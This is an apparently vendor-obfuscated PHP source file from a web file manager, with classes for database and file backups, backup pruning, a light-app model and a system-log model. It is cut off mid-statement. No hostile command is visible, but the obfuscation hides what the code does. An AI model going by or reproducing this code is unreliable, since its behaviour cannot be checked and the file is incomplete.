<?php
 goto eàĞ¶’ÖÚ‚; a¬¸ï¾ôÂ´: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[÷åé¼î][813]); $this->init(); $this->keep(); } public function init() { $­˜´àéõ =& $_SERVER[÷åé¼î]; $this->isManual(); self::$name = date($­˜´àéõ[814]); if (!($¡˜ÇÖï = $this->model->lastItem())) { $¡˜ÇÖï = $this->initData(); } else { self::$name = $¡˜ÇÖï[$­˜´àéõ[32]]; if ($¡˜ÇÖï[$­˜´àéõ[815]] == $­˜´àéõ[91]) { self::$name = date($­˜´àéõ[272]); $¥½ÓÃµ = intval(_get($¡˜ÇÖï, $­˜´àéõ[816], 0)); if (self::$manual == 0 && $¡˜ÇÖï[$­˜´àéõ[32]] == self::$name) { $this->model->remove($¡˜ÇÖï[$­˜´àéõ[459]]); } $¡˜ÇÖï = $this->initData($¥½ÓÃµ, $¡˜ÇÖï[$­˜´àéõ[817]]); } else { $this->checkStore($¡˜ÇÖï[$­˜´àéõ[817]]); } } self::$option = $¡˜ÇÖï; } private function isManual() { $óûüİ³° = _get($GLOBALS, $_SERVER[÷åé¼î][818], 0); $óûüİ³° = intval($óûüİ³°); self::$manual = $óûüİ³° && $óûüİ³° == 1 ? 1 : 0; } private function initData($áæ´Ó¶ = 0, $ëÕ¿îû = '') { $Ú‰ŒÔò¶ =& $_SERVER[÷åé¼î]; $Òèï¡ì = $this->model->config(); if ($ëÕ¿îû && $Òèï¡ì[$Ú‰ŒÔò¶[817]] != $ëÕ¿îû) { $áæ´Ó¶ = 0; } $this->checkStore($Òèï¡ì[$Ú‰ŒÔò¶[817]]); if (self::$manual == 1) { self::$name .= $Ú‰ŒÔò¶[11] . date($Ú‰ŒÔò¶[819]); } $Ü—ÒöÕ = array($Ú‰ŒÔò¶[817] => $Òèï¡ì[$Ú‰ŒÔò¶[817]], $Ú‰ŒÔò¶[32] => self::$name, $Ú‰ŒÔò¶[815] => 0, $Ú‰ŒÔò¶[171] => $Òèï¡ì[$Ú‰ŒÔò¶[171]], $Ú‰ŒÔò¶[820] => self::$manual, $Ú‰ŒÔò¶[353] => array($Ú‰ŒÔò¶[821] => array($Ú‰ŒÔò¶[815] => 0), $Ú‰ŒÔò¶[822] => array($Ú‰ŒÔò¶[815] => 0, $Ú‰ŒÔò¶[823] => 0, $Ú‰ŒÔò¶[824] => 0, $Ú‰ŒÔò¶[33] => $Ú‰ŒÔò¶[12], $Ú‰ŒÔò¶[825] => 0, $Ú‰ŒÔò¶[826] => 0), $Ú‰ŒÔò¶[827] => array($Ú‰ŒÔò¶[815] => 0, $Ú‰ŒÔò¶[823] => 0, $Ú‰ŒÔò¶[824] => 0, $Ú‰ŒÔò¶[825] => 0, $Ú‰ŒÔò¶[826] => 0), $Ú‰ŒÔò¶[230] => array($Ú‰ŒÔò¶[815] => 0, $Ú‰ŒÔò¶[828] => 0, $Ú‰ŒÔò¶[829] => 0, $Ú‰ŒÔò¶[830] => 0, $Ú‰ŒÔò¶[831] => 0, $Ú‰ŒÔò¶[525] => $áæ´Ó¶, $Ú‰ŒÔò¶[825] => 0, $Ú‰ŒÔò¶[826] => 0)), $Ú‰ŒÔò¶[825] => time(), $Ú‰ŒÔò¶[826] => 0); $óÜ€¶çØ = $this->model->insert($Ü—ÒöÕ); $Ü—ÒöÕ[$Ú‰ŒÔò¶[459]] = $óÜ€¶çØ; return $Ü—ÒöÕ; } private function checkStore($èÍ®Ãì¨) { $¨Ç’Šò£ = Model($_SERVER[÷åé¼î][832]); $éŒÆûÆÈ = $¨Ç’Šò£->listData($èÍ®Ãì¨); $¨Ç’Šò£->checkConfig($éŒÆûÆÈ); } public static function get() { if (!self::$option) { $£Ÿù¶¯ = Model($_SERVER[÷åé¼î][813]); $æüÚĞ– = $£Ÿù¶¯->findByName(self::$name); $£Ÿù¶¯->parseContent($æüÚĞ–); self::$option = $æüÚĞ–; } return self::$option; } public static function set($µâîÎÍş) { $‹ÓôÛ¸® =& $_SERVER[÷åé¼î]; $çŒ¡ şá = self::get(); foreach ($µâîÎÍş as $·ŞóÓ‚Ä => $‡¯Ïò·Ç) { array_set_value($çŒ¡ şá, $·ŞóÓ‚Ä, $‡¯Ïò·Ç); } Model($‹ÓôÛ¸®[813])->update($çŒ¡ şá[$‹ÓôÛ¸®[459]], $çŒ¡ şá); self::$option = $çŒ¡ şá; return self::$option; } public function keep() { $Šû‡×ê =& $_SERVER[÷åé¼î]; $ïŒ¾¼üÅ = self::get(); if (_get($ïŒ¾¼üÅ, $Šû‡×ê[833], 0) == $Šû‡×ê[91]) { return; } $this->backupKeep($ïŒ¾¼üÅ); self::set(array($Šû‡×ê[833] => 1)); } private function backupKeep($¹×éõÎ) { $»ÄÎµÁ’ =& $_SERVER[÷åé¼î]; if (self::$manual == 1) { return; } $û…¾ÁÇå = $this->model->listData(); if (empty($û…¾ÁÇå)) { return; } $ô¼ïê’à = 0; $‚§†Ú¤ = array(); foreach ($û…¾ÁÇå as $Îâ¤ñ) { if ($ô¼ïê’à >= 7) { break; } $‚§†Ú¤[] = $Îâ¤ñ[$»ÄÎµÁ’[32]]; $ô¼ïê’à++; } for ($ô¼ïê’à = 0; $ô¼ïê’à < 12; $ô¼ïê’à++) { $‚§†Ú¤[] = date($»ÄÎµÁ’[834], strtotime("\55{$ô¼ïê’à}\40\x6d\157\156\x74\x68\x73")); } $‚§†Ú¤ = array_unique($‚§†Ú¤); $°˜ú…ì† = Model($»ÄÎµÁ’[835])->get($»ÄÎµÁ’[836]); foreach ($û…¾ÁÇå as $Îâ¤ñ) { if (isset($Îâ¤ñ[$»ÄÎµÁ’[820]]) && $Îâ¤ñ[$»ÄÎµÁ’[820]] == $»ÄÎµÁ’[91]) { continue; } if (!empty($Îâ¤ñ[$»ÄÎµÁ’[32]]) && in_array($Îâ¤ñ[$»ÄÎµÁ’[32]], $‚§†Ú¤)) { continue; } $this->model->remove($Îâ¤ñ[$»ÄÎµÁ’[459]]); $Ôá“âè  = $this->backupPath($¹×éõÎ, $°˜ú…ì†); IO::remove($Ôá“âè , !1); } } private function backupPath($€å˜ªà·, $”âÑÙÑ = false) { $‚…æË° =& $_SERVER[÷åé¼î]; if (!$”âÑÙÑ) { $”âÑÙÑ = Model($‚…æË°[835])->get($‚…æË°[836]); } $°£¸á¼Ë = $€å˜ªà·[$‚…æË°[32]]; $ÓÈĞ™ú® = substr(md5($‚…æË°[837] . $”âÑÙÑ . $°£¸á¼Ë), 0, 8); return "\x7b\151\x6f\x3a{$€å˜ªà·[$‚…æË°[817]]}\175\57\144\141\164\141\142\x61\x73\145\57\142\141\143\x6b\165\x70\57" . $°£¸á¼Ë . $‚…æË°[11] . $ÓÈĞ™ú®; } public function db() { $”®¦ƒÚ¯ =& $_SERVER[÷åé¼î]; $ñ¯÷¶­¯ = self::get(); if (_get($ñ¯÷¶­¯, $”®¦ƒÚ¯[838], 0) == $”®¦ƒÚ¯[91]) { return !0; } $¥Ó¡Ğä = new BackupDb(); if (!$¥Ó¡Ğä->index()) { return !1; } self::set(array($”®¦ƒÚ¯[838] => 1)); return !0; } public function dbFile() { $“ “¡Ë =& $_SERVER[÷åé¼î]; $ÖëåÎËæ = self::get(); if (_get($ÖëåÎËæ, $“ “¡Ë[839], 0) == $“ “¡Ë[91]) { return !0; } $É£›ÊŒ³ = new BackupDbFile(); if (!$É£›ÊŒ³->index()) { return !1; } self::set(array($“ “¡Ë[839] => 1)); return !0; } public function file() { $èØ£ñ =& $_SERVER[÷åé¼î]; $ÍËØÃŒ = self::get(); if (_get($ÍËØÃŒ, $èØ£ñ[840], 0) == $èØ£ñ[91]) { return !0; } if ($ÍËØÃŒ[$èØ£ñ[171]] == $èØ£ñ[841]) { $Œï†½–‰ = new BackupFile(); if (!$Œï†½–‰->index()) { return !1; } } self::set(array($èØ£ñ[840] => 1, $èØ£ñ[815] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Í¦±À˜¨ =& $_SERVER[÷åé¼î]; $¬Î‹Âãº = Backup::get(); self::$io = $¬Î‹Âãº[$Í¦±À˜¨[817]]; self::$name = $¬Î‹Âãº[$Í¦±À˜¨[32]]; $‹²Ñş‰÷ = new DbManage(); $àæİáÆ = $‹²Ñş‰÷->dbType(); $±±ããşë = array($Í¦±À˜¨[842] => $àæİáÆ, $Í¦±À˜¨[843] => time()); Backup::set($±±ããşë); $–Â‘èˆ = $this->tmpFilesPath() . $Í¦±À˜¨[844] . self::$name . $Í¦±À˜¨[8]; del_dir($–Â‘èˆ); mk_dir($–Â‘èˆ); $å®Ÿµ½‰ = $¹÷ŸÙÌ³ = 0; try { $…ó´¹·Ä = $‹²Ñş‰÷->db()->getTables(); } catch (Exception $­Ô²¿ö´) { return !1; } $…ó´¹·Ä = array_diff($…ó´¹·Ä, array($Í¦±À˜¨[845], $Í¦±À˜¨[846])); foreach ($…ó´¹·Ä as $òÙ¨­¥Â) { $å®Ÿµ½‰ += $‹²Ñş‰÷->model($òÙ¨­¥Â)->count(); } $™¹”×‚ = new Task($Í¦±À˜¨[847], $Í¦±À˜¨[848], $å®Ÿµ½‰, LNG($Í¦±À˜¨[849]) . $Í¦±À˜¨[850] . LNG($Í¦±À˜¨[851])); $GLOBALS[$Í¦±À˜¨[852]] = self::$name; foreach ($…ó´¹·Ä as $òÙ¨­¥Â) { $ãö„°™ô = $–Â‘èˆ . $òÙ¨­¥Â . $Í¦±À˜¨[853]; $†Í¿ûà = null; if ($òÙ¨­¥Â == $Í¦±À˜¨[854] && (!isset($¬Î‹Âãº[$Í¦±À˜¨[171]]) || $¬Î‹Âãº[$Í¦±À˜¨[171]] == $Í¦±À˜¨[228])) { $†Í¿ûà = self::$io; } $¹÷ŸÙÌ³ += $‹²Ñş‰÷->sqlFromDb($òÙ¨­¥Â, $ãö„°™ô, $™¹”×‚, $†Í¿ûà); } unset($GLOBALS[$Í¦±À˜¨[852]]); $™¹”×‚->end(); if ($¹÷ŸÙÌ³ > $å®Ÿµ½‰) { $å®Ÿµ½‰ = $¹÷ŸÙÌ³; } $±±ããşë = array($Í¦±À˜¨[842] => $àæİáÆ, $Í¦±À˜¨[838] => 1, $Í¦±À˜¨[855] => $å®Ÿµ½‰, $Í¦±À˜¨[856] => $¹÷ŸÙÌ³, $Í¦±À˜¨[857] => time()); Backup::set($±±ããşë); if ($å®Ÿµ½‰ - $¹÷ŸÙÌ³ > 0) { $ê¨ùÃÂ‰ = $Í¦±À˜¨[858]; if (!stristr(I18n::getType(), $Í¦±À˜¨[859])) { $ê¨ùÃÂ‰ = $Í¦±À˜¨[860]; } write_log(array($ê¨ùÃÂ‰, $±±ããşë), $Í¦±À˜¨[848]); return !1; } return !0; } private function tmpFilesPath() { $µÕ¹³Õ =& $_SERVER[÷åé¼î]; $öûÈƒù = TEMP_FILES; if ($GLOBALS[$µÕ¹³Õ[6]][$µÕ¹³Õ[92]][$µÕ¹³Õ[861]]) { $öûÈƒù = $GLOBALS[$µÕ¹³Õ[6]][$µÕ¹³Õ[92]][$µÕ¹³Õ[861]]; if (!mk_dir($öûÈƒù) || !is_writable($öûÈƒù) || !IO::mkfile($öûÈƒù . $µÕ¹³Õ[862])) { $öûÈƒù = TEMP_FILES; } } return $öûÈƒù; } } class BackupDbFile { public function __construct() { } public function index() { $£ÓêŒü¨ =& $_SERVER[÷åé¼î]; $® ‚üŸ• = Backup::get(); $÷§»”Ä = $® ‚üŸ•[$£ÓêŒü¨[32]]; $Ì šúë‘ = $this->tmpFilesPath() . "\x62\141\143\x6b\165\160\137{$÷§»”Ä}\57"; $“­šêôÚ = $this->backupPath($® ‚üŸ•); if (!($“­šêôÚ = IO::mkdir($“­šêôÚ))) { return !1; } $„ï¬åÃß = IO::listPath($Ì šúë‘); $ˆ™¸Èãç = isset($„ï¬åÃß[$£ÓêŒü¨[86]]) ? $„ï¬åÃß[$£ÓêŒü¨[86]] : array(); $âğ®«Õü = array_sum(array_column($ˆ™¸Èãç, $£ÓêŒü¨[79])); if (!$âğ®«Õü) { return !1; } $êÎô²­ö = array($£ÓêŒü¨[863] => $âğ®«Õü, $£ÓêŒü¨[864] => time()); Backup::set($êÎô²­ö); $åØğ¡¨Œ = new TaskFileTransfer($£ÓêŒü¨[865], $£ÓêŒü¨[848], count($ˆ™¸Èãç), LNG($£ÓêŒü¨[849]) . $£ÓêŒü¨[446] . LNG($£ÓêŒü¨[851]) . $£ÓêŒü¨[866]); $åØğ¡¨Œ->task[$£ÓêŒü¨[828]] = $âğ®«Õü; foreach ($„ï¬åÃß[$£ÓêŒü¨[86]] as $óó¸‚á») { $§ÔÜÈèÛ = IO::move($óó¸‚á»[$£ÓêŒü¨[87]], $“­šêôÚ); if (!$§ÔÜÈèÛ) { $åØğ¡¨Œ->end(); $ÂæøˆÕ² = IO::getLastError($£ÓêŒü¨[867] . $óó¸‚á»[$£ÓêŒü¨[87]] . $£ÓêŒü¨[868] . $“­šêôÚ . $£ÓêŒü¨[178]); write_log($ÂæøˆÕ², $£ÓêŒü¨[848]); return !1; } } $ò”Àö”“ = new DbManage(); $¾—£Åªê = $ò”Àö”“->getSqlFile(); if (!$¾—£Åªê[$£ÓêŒü¨[869]] || !$¾—£Åªê[$£ÓêŒü¨[13]]) { return !1; } IO::move($¾—£Åªê[$£ÓêŒü¨[869]], $“­šêôÚ); IO::move($¾—£Åªê[$£ÓêŒü¨[13]], $“­šêôÚ); $åØğ¡¨Œ->end(); $êÎô²­ö = array($£ÓêŒü¨[870] => $âğ®«Õü, $£ÓêŒü¨[871] => time()); Backup::set($êÎô²­ö); return !0; } private function backupPath($ÒâĞ›¤õ) { $ÒÜ”¿ =& $_SERVER[÷åé¼î]; $·¿†¤÷ = $ÒâĞ›¤õ[$ÒÜ”¿[32]]; $“¥·ñë² = Model($ÒÜ”¿[835])->get($ÒÜ”¿[836]); $Î¨ÁÄİ¹ = substr(md5($ÒÜ”¿[837] . $“¥·ñë² . $·¿†¤÷), 0, 8); return "\x7b\x69\157\72{$ÒâĞ›¤õ[$ÒÜ”¿[817]]}\175\x2f\144\x61\x74\x61\x62\x61\163\x65\x2f\x62\x61\x63\153\x75\160\x2f" . $·¿†¤÷ . $ÒÜ”¿[11] . $Î¨ÁÄİ¹; } private function tmpFilesPath() { $•Œ”ÉıÒ =& $_SERVER[÷åé¼î]; $–·†º¡à = TEMP_FILES; if ($GLOBALS[$•Œ”ÉıÒ[6]][$•Œ”ÉıÒ[92]][$•Œ”ÉıÒ[861]]) { $–·†º¡à = $GLOBALS[$•Œ”ÉıÒ[6]][$•Œ”ÉıÒ[92]][$•Œ”ÉıÒ[861]]; if (!mk_dir($–·†º¡à) || !is_writable($–·†º¡à) || !IO::mkfile($–·†º¡à . $•Œ”ÉıÒ[862])) { $–·†º¡à = TEMP_FILES; } } return $–·†º¡à; } } goto AÎ•‹‚ÖÁ¤; aø¥©¹ÇÃ®: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\x4c\151\x67\x68\164\x41\160\160"; public $modelType = "\x53\x79\x73\164\x65\155\117\x70\x74\151\157\x6e"; public $field = array("\156\141\x6d\145", "\147\162\x6f\x75\160", "\x64\145\163\143", "\x63\157\156\164\x65\x6e\164"); public function listData($“ÆÊŸãà = false, $É¤¹Ü×ù = "\x6d\x6f\x64\151\146\171\x54\x69\155\145", $Úó®¼‚‡ = true) { return parent::listData($“ÆÊŸãà, $É¤¹Ü×ù, $Úó®¼‚‡); } public function remove($üŠŞ²ÔÕ) { $Îºà±„ = $this->findByName($üŠŞ²ÔÕ); if (!$Îºà±„) { return !1; } return parent::remove($Îºà±„[$_SERVER[÷åé¼î][459]]); } public function add($Ç®ĞÚäÁ) { if ($this->findByName($Ç®ĞÚäÁ[$_SERVER[÷åé¼î][32]])) { return !1; } return parent::insert($Ç®ĞÚäÁ); } public function update($§Ğãñ§Æ, $¿¤Ó†Ùİ) { $ÙÛ¡ûéâ =& $_SERVER[÷åé¼î]; $‘Ó–é« = $this->findByName($§Ğãñ§Æ); $¦‹É·ˆ = $this->findByName($¿¤Ó†Ùİ[$ÙÛ¡ûéâ[32]]); if (!$‘Ó–é« || $¦‹É·ˆ && $¦‹É·ˆ[$ÙÛ¡ûéâ[459]] != $‘Ó–é«[$ÙÛ¡ûéâ[459]]) { return !1; } return parent::update($‘Ó–é«[$ÙÛ¡ûéâ[459]], $¿¤Ó†Ùİ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\124\151\155\x65", "\164\151\x6d\145", "\x69\156\163\145\162\x74", "\x66\x75\x6e\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ì˜À§ÃÜ =& $_SERVER[÷åé¼î]; return array($ì˜À§ÃÜ[2337] => LNG($ì˜À§ÃÜ[2338]), $ì˜À§ÃÜ[2339] => LNG($ì˜À§ÃÜ[2340]), $ì˜À§ÃÜ[1920] => LNG($ì˜À§ÃÜ[2341]), $ì˜À§ÃÜ[2342] => LNG($ì˜À§ÃÜ[2343]), $ì˜À§ÃÜ[2344] => LNG($ì˜À§ÃÜ[2345]), $ì˜À§ÃÜ[2346] => LNG($ì˜À§ÃÜ[2347]), $ì˜À§ÃÜ[2348] => LNG($ì˜À§ÃÜ[2349]), $ì˜À§ÃÜ[1950] => LNG($ì˜À§ÃÜ[2349]), $ì˜À§ÃÜ[1951] => LNG($ì˜À§ÃÜ[2350]), $ì˜À§ÃÜ[2351] => LNG($ì˜À§ÃÜ[2352]), $ì˜À§ÃÜ[2353] => LNG($ì˜À§ÃÜ[2354]), $ì˜À§ÃÜ[2355] => LNG($ì˜À§ÃÜ[2356]), $ì˜À§ÃÜ[2357] => LNG($ì˜À§ÃÜ[2358]), $ì˜À§ÃÜ[1948] => LNG($ì˜À§ÃÜ[2359]), $ì˜À§ÃÜ[2360] => LNG($ì˜À§ÃÜ[2361]), $ì˜À§ÃÜ[1955] => LNG($ì˜À§ÃÜ[2362]), $ì˜À§ÃÜ[2363] => LNG($ì˜À§ÃÜ[2364]), $ì˜À§ÃÜ[2365] => LNG($ì˜À§ÃÜ[2366]), $ì˜À§ÃÜ[2367] => LNG($ì˜À§ÃÜ[2368]), $ì˜À§ÃÜ[2369] => LNG($ì˜À§ÃÜ[2370]), $ì˜À§ÃÜ[1958] => LNG($ì˜À§ÃÜ[2371]), $ì˜À§ÃÜ[1959] => LNG($ì˜À§ÃÜ[2372]), $ì˜À§ÃÜ[2373] => LNG($ì˜À§ÃÜ[2374]), $ì˜À§ÃÜ[2375] => LNG($ì˜À§ÃÜ[2376]), $ì˜À§ÃÜ[2377] => LNG($ì˜À§ÃÜ[2378]), $ì˜À§ÃÜ[1953] => LNG($ì˜À§ÃÜ[2379]), $ì˜À§ÃÜ[2380] => LNG($ì˜À§ÃÜ[2381]), $ì˜À§ÃÜ[1952] => LNG($ì˜À§ÃÜ[2382]), $ì˜À§ÃÜ[2383] => LNG($ì˜À§ÃÜ[2384]), $ì˜À§ÃÜ[2385] => LNG($ì˜À§ÃÜ[2386]), $ì˜À§ÃÜ[2387] => LNG($ì˜À§ÃÜ[2386]), $ì˜À§ÃÜ[2388] => LNG($ì˜À§ÃÜ[2389]), $ì˜À§ÃÜ[2390] => LNG($ì˜À§ÃÜ[2390]), $ì˜À§ÃÜ[2391] => LNG($ì˜À§ÃÜ[1924]), $ì˜À§ÃÜ[2392] => LNG($ì˜À§ÃÜ[2393]), $ì˜À§ÃÜ[2394] => LNG($ì˜À§ÃÜ[2395]), $ì˜À§ÃÜ[2396] => LNG($ì˜À§ÃÜ[2397]), $ì˜À§ÃÜ[2398] => LNG($ì˜À§ÃÜ[2399]), $ì˜À§ÃÜ[2400] => LNG($ì˜À§ÃÜ[2401]), $ì˜À§ÃÜ[2402] => LNG($ì˜À§ÃÜ[2402]), $ì˜À§ÃÜ[2403] => LNG($ì˜À§ÃÜ[2404]), $ì˜À§ÃÜ[2405] => LNG($ì˜À§ÃÜ[2406]), $ì˜À§ÃÜ[2407] => LNG($ì˜À§ÃÜ[2408]), $ì˜À§ÃÜ[2409] => LNG($ì˜À§ÃÜ[2410]), $ì˜À§ÃÜ[2411] => LNG($ì˜À§ÃÜ[2412]), $ì˜À§ÃÜ[2413] => LNG($ì˜À§ÃÜ[2414]), $ì˜À§ÃÜ[212] => LNG($ì˜À§ÃÜ[212]), $ì˜À§ÃÜ[213] => LNG($ì˜À§ÃÜ[2415]), $ì˜À§ÃÜ[2416] => LNG($ì˜À§ÃÜ[2416])); } private function typeFile() { $´êéî’¥ =& $_SERVER[÷åé¼î]; $£ˆØô½• = array($´êéî’¥[1955] => array($´êéî’¥[1956]), $´êéî’¥[2355] => array($´êéî’¥[2417]), $´êéî’¥[2357] => array($´êéî’¥[2418]), $´êéî’¥[1948] => array($´êéî’¥[1949], $´êéî’¥[2419]), $´êéî’¥[2365] => array(), $´êéî’¥[2367] => array(), $´êéî’¥[2369] => array(), $´êéî’¥[1958] => array($´êéî’¥[1960]), $´êéî’¥[1959] => array($´êéî’¥[1960]), $´êéî’¥[2373] => array($´êéî’¥[2420]), $´êéî’¥[2375] => array($´êéî’¥[2420]), $´êéî’¥[2377] => array($´êéî’¥[2421]), $´êéî’¥[2363] => array($´êéî’¥[2422]), $´êéî’¥[1953] => array($´êéî’¥[2423]), $´êéî’¥[2380] => array($´êéî’¥[2424]), $´êéî’¥[1952] => array($´êéî’¥[1954])); return $£ˆØô½•; } private function typeAll() { $ïä´¬ë =& $_SERVER[÷åé¼î]; $ııø„×¾ = $this->typeList; $ÛØËûè = array_filter($this->typeFile()); foreach ($ÛØËûè as $ÂñµæóË => $¤æ‡áª) { $ııø„×¾[$¤æ‡áª[0]] = $ııø„×¾[$ÂñµæóË]; } $ııø„×¾[$ïä´¬ë[1960]] = LNG($ïä´¬ë[2425]); $ııø„×¾[$ïä´¬ë[2420]] = LNG($ïä´¬ë[2426]); return $ııø„×¾; } public function addLog($ßÎôœ©‡, $†“°Ïá = array()) { $¬ìÁ€Æ“ =& $_SERVER[÷åé¼î]; if (!isset($this->typeList[$ßÎôœ©‡])) { return; } $»ïÑÒúª = Session::get($¬ìÁ€Æ“[2118]); if (!$»ïÑÒúª) { $»ïÑÒúª = _get($†“°Ïá, $¬ìÁ€Æ“[1779], 0); } if ($ßÎôœ©‡ == $¬ìÁ€Æ“[2392] && is_array($†“°Ïá[$¬ìÁ€Æ“[2427]]) && !$†“°Ïá[$¬ìÁ€Æ“[2427]]) { return; } $¤ÔıÆ’‡ = get_client_ip(); if (!$†“°Ïá || strlen(json_encode($†“°Ïá)) >= 1024 * 64) { if ($†“°Ïá && is_array($†“°Ïá)) { $†“°Ïá = array_intersect_key($†“°Ïá, array_flip($¬ìÁ€Æ“[459], $¬ìÁ€Æ“[32])); $†“°Ïá[$¬ìÁ€Æ“[2428]] = $¤ÔıÆ’‡; } else { $†“°Ïá = array($¬ìÁ€Æ“[2428] => $¤ÔıÆ’‡); } } else { if (is_array($†“°Ïá)) { $†“°Ïá[$¬ìÁ€Æ“[2428]] = $¤ÔıÆ’‡; } else { $†“°Ïá = array($¬ìÁ€Æ“[1281] => $†“°Ïá, $¬ìÁ€Æ“[2428] => $¤ÔıÆ’‡); } } $†“°Ïá = array($¬ìÁ€Æ“[1769] => Session::sign(), $¬ìÁ€Æ“[1770] => intval($»ïÑÒúª), $¬ìÁ€Æ“[33] => $ßÎôœ©‡, $¬ìÁ€Æ“[1772] => json_encode($†“°Ïá)); parent::add($†“°Ïá); } public function remove($±‰ŞÄ‹â) { $this->where(array($_SERVER[÷åé¼î][477] => $±‰ŞÄ‹â))->delete(); } private function _makeOrder($´õØãìÊ = '') { $ÑÔ–„¡ =& $_SERVER[÷åé¼î]; $î´º¯ Ğ = $ÑÔ–„¡[231]; $‡îëœõÊ = array($ÑÔ–„¡[507] => $ÑÔ–„¡[508], $ÑÔ–„¡[509] => $ÑÔ–„¡[510]); $ùêÁÇĞ£ = Input::get($ÑÔ–„¡[515], $ÑÔ–„¡[7], $ÑÔ–„¡[2154], array($ÑÔ–„¡[2072], $ÑÔ–„¡[509])); $ùêÁÇĞ£ = $‡îëœõÊ[$ùêÁÇĞ£]; $´õØãìÊ = $´õØãìÊ . "{$î´º¯ Ğ}\x20{$ùêÁÇĞ£}"; return $this->order($´õØãìÊ); } public function get($´Øú“ÍÅ = '') { $šŸ¼¥à“ =& $_SERVER[÷åé¼î]; if (!$´Øú“ÍÅ) { show_json(array()); } $¸’¨ÒÅª = array(); if ($´Øú“ÍÅ[$šŸ¼¥à“[1779]]) { $¸’¨ÒÅª[$šŸ¼¥à“[1779]] = $´Øú“ÍÅ[$šŸ¼¥à“[1779]]; } if (isset($´Øú“ÍÅ[$šŸ¼¥à“[825]])) { $­•ÈÜ™ = $´Øú“ÍÅ[$šŸ¼¥à“[825]]; $È™˜‹¼É = isset($´Øú“ÍÅ[$šŸ¼¥à“[826]]) ? $´Øú“ÍÅ[$šŸ¼¥à“[826]] : time(); $¸’¨ÒÅª[$šŸ¼¥à“[231]] = array($šŸ¼¥à“[393], array($­•ÈÜ™, $È™˜‹¼É)); } if ($´Øú“ÍÅ[$šŸ¼¥à“[33]]) { $Õ³‰±ÕÎ = explode($šŸ¼¥à“[50], $´Øú“ÍÅ[$šŸ¼¥à“[33]]); $æ¹­úÀ = $this->typeFile(); $°º™«‹¦ = array(); foreach ($Õ³‰±ÕÎ as $ìÚîå×Ã) { $°º™«‹¦[] = $ìÚîå×Ã; if (isset($æ¹­úÀ[$ìÚîå×Ã])) { $°º™«‹¦ = array_merge($°º™«‹¦, $æ¹­úÀ[$ìÚîå×Ã]); } } $°º™«‹¦ = array_unique($°º™«‹¦); if ($°º™«‹¦) { $¸’¨ÒÅª[$šŸ¼¥à“[33]] = array($šŸ¼¥à“[7], $°º™«‹¦); } } else { $¸’¨ÒÅª[$šŸ¼¥à“[33]] = array($šŸ¼¥à“[2429], $šŸ¼¥à“[2430]); } if (!empty($´Øú“ÍÅ[$šŸ¼¥à“[2428]])) { $¸’¨ÒÅª[$šŸ¼¥à“[510]] = array($šŸ¼¥à“[443], "\x25{$´Øú“ÍÅ[$šŸ¼¥à“[2428]]}\x25"); } $´íÒ¶ßŞ = $this->_makeOrder()->where($¸’¨ÒÅª)->selectPage(); if (empty($´íÒ¶ßŞ[$šŸ¼¥à“[429]])) { show_json(array(), !0, $´íÒ¶ßŞ[$šŸ¼¥à“[426]]); } $´íÒ¶ßŞ[$šŸ¼¥à“[429]] = $this->logList($´íÒ¶ßŞ[$šŸ¼¥à“[429]]); return $´íÒ¶ßŞ; } private function ipAddress(&$©–¢‰Ñ±) { $˜––„™á =& $_SERVER[÷åé¼î]; if (!empty($©–¢‰Ñ±[$˜––„™á[2428]])) { $³˜Ë„« = IpLocation::get($©–¢‰Ñ±[$˜––„™á[2428]]); } else { $³˜Ë„« = LNG($˜––„™á[2431]); } $©–¢‰Ñ±[$˜––„™á[2432]] = $³˜Ë„«; } private function descZipDownload($ÕÇ“ÒŸ‰, &$éÕÄ¯Ÿö) { $»Úê“£– =& $_SERVER[÷åé¼î]; if (!isset($ÕÇ“ÒŸ‰[$»Úê“£–[2433]])) { return; } $œ§í˜ñº = json_decode($ÕÇ“ÒŸ‰[$»Úê“£–[2433]], !0); foreach ($œ§í˜ñº as $µ×Àã ) { try { $è„Ÿ›ñª = IO::infoFullSimple($µ×Àã [$»Úê“£–[87]]); } catch (Exception $Ó£õàûÉ) { continue; } $ÕÇ“ÒŸ‰[$»Úê“£–[87]] = $µ×Àã [$»Úê“£–[87]]; $éÕÄ¯Ÿö[] = $ÕÇ“ÒŸ‰[$»Úê“£–[193]] = $è„Ÿ›ñª[$»Úê“£–[193]]; $éÕÄ¯Ÿö[] = $ÕÇ“ÒŸ‰[$»Úê“£–[2210]] = $è„Ÿ›ñª[$»Úê“£–[192]]; break; } return $ÕÇ“ÒŸ‰; } private function getSourceList(&$ÌŞÑ¡ì„) { $”Îß”ø =& $_SERVER[÷åé¼î]; $Á­İú¬ƒ = array(); foreach ($ÌŞÑ¡ì„ as $„ˆ°åäñ => $÷Çö‡ñ) { $Íæ–©« = json_decode($÷Çö‡ñ[$”Îß”ø[510]], !0); if ($÷Çö‡ñ[$”Îß”ø[33]] == $”Îß”ø[1951]) { $Íæ–©« = $this->descZipDownload($Íæ–©«, $Á­İú¬ƒ); $ÌŞÑ¡ì„[$„ˆ°åäñ][$”Îß”ø[510]] = json_encode($Íæ–©«); continue; } if (strpos($÷Çö‡ñ[$”Îß”ø[33]], $”Îß”ø[2212]) !== 0) { if (!isset($Íæ–©«[$”Îß”ø[87]]) || strpos($÷Çö‡ñ[$”Îß”ø[33]], $”Îß”ø[2434]) !== 0) { continue; } try { $´¼¢ã‰Ì = IO::infoFullSimple($Íæ–©«[$”Îß”ø[87]]); } catch (Exception $ÓÍ£áß) { continue; } $Á­İú¬ƒ[] = $Íæ–©«[$”Îß”ø[193]] = $´¼¢ã‰Ì[$”Îß”ø[193]]; $Á­İú¬ƒ[] = $Íæ–©«[$”Îß”ø[2210]] = $´¼¢ã‰Ì[$”Îß”ø[192]]; $ÌŞÑ¡ì„[$„ˆ°åäñ][$”Îß”ø[510]] = json_encode($Íæ–©«); continue; } $Á­İú¬ƒ[] = $Íæ–©«[$”Îß”ø[193]]; $Á­İú¬ƒ[] = $Íæ–©«[$”Îß”ø[2210]]; if ($Íæ–©«[$”Îß”ø[33]] == $”Îß”ø[604]) { $Á­İú¬ƒ[] = 